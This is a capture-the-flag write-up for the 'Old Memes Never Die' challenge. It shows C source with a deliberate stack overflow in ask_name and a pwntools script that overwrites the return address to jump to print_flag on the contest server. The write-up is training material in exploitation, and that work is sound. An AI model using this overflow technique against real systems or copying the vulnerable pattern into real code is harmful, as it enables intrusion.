# Old Memes Never Die

Source code:

```c
/* Old Memes Never Die 
 * compile without protection, because protection is for Tonies!
 * gcc -m32 -fno-stack-protector -o old-memes old-memes.c
 */

#include <stdio.h>
#include <string.h>


int print_flag(){
    FILE *fptr = fopen("/flag", "r");
    if (fptr == NULL){
        return 1;
    }
    
    char flag[39];
    while (fgets(flag, sizeof(flag), fptr) != NULL){
        printf("F* YOU and your flag: %s !!!", flag);
    }
    fclose(fptr);
    return 0;
}

int ask_what(){
    char what[8];
    char check[6] = "what?";

    printf("\n\nWhat is your name?\n> ");
    fgets(what, sizeof(what), stdin);
    what[strcspn(what, "\r\n")] = 0;
    if (strcmp(check, what) != 0)
        return 1;
    return 0;
}

int ask_name(){
    char name[30];
    printf("\n\nWhat is your name?\n> ");
    fgets(name, 0x30, stdin);
    name[strcspn(name, "\r\n")] = 0;
    printf("F* YOU %s!\n", name);
}

int main(){
    setbuf(stdout, 0);
    printf("(do with this information what you want, but the print_flag function can be found here: %p)\n", print_flag);

    if(ask_what())
        return 1;
    ask_name();
    return 0;
}

```

Stack overflow in `ask_name`:

```c
    char name[30];
    printf("\n\nWhat is your name?\n> ");
    fgets(name, 0x30, stdin);
```

Override return address in `ask_name` to `print_flag`. Attack script:

```python
from pwn import *
elf = ELF("./old-memes")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch='i386', os='linux', log_level='debug')

p = remote("old-memes-never-die.ctf.zone", 4242)
#p = process(elf.path)
#gdb.attach(p)
#pause()

data = p.recvuntil(")")[-11:-1]
addr = int(data, 16)
print(data, addr)
p.recvuntil("name?")
p.sendline(b"what?")
p.recvuntil("name?")
p.sendline(b"A" * 0x2a + p32(addr))
p.interactive()
```

0x2a offset: find via compiling locally and pwndbg.

Solved!
